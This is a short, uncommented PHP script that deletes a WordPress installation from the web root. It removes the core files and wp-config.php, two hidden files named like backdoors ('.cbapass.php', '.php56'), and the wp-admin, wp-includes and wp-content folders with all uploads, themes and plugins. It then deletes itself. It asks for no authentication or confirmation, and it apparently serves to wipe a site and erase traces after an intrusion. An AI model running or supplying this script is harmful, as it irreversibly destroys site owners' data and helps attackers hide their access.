<?php
$files = [
    'wp-activate.php', 'wp-blog-header.php', 'wp-comments-post.php',
    'wp-config.php', 'wp-config-sample.php', 'wp-cron.php',
    'wp-links-opml.php', 'wp-load.php', 'wp-login.php', 'wp-mail.php',
    'wp-settings.php', 'wp-signup.php', 'wp-trackback.php',
    'xmlrpc.php', 'index.php', 'readme.html', 'license.txt',
    '.cbapass.php', '.php56'
];

foreach ($files as $file) {
    if (file_exists($file)) {
        unlink($file);
        echo "Deleted: $file<br>";
    }
}

function deleteDir($dir) {
    if (!is_dir($dir)) return;
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . '/' . $item;
        is_dir($path) ? deleteDir($path) : unlink($path);
    }
    rmdir($dir);
    echo "Deleted folder: $dir<br>";
}

deleteDir('wp-admin');
deleteDir('wp-includes');
deleteDir('wp-content');

echo "<br><b>WordPress deleted!</b>";
unlink(__FILE__);
?>
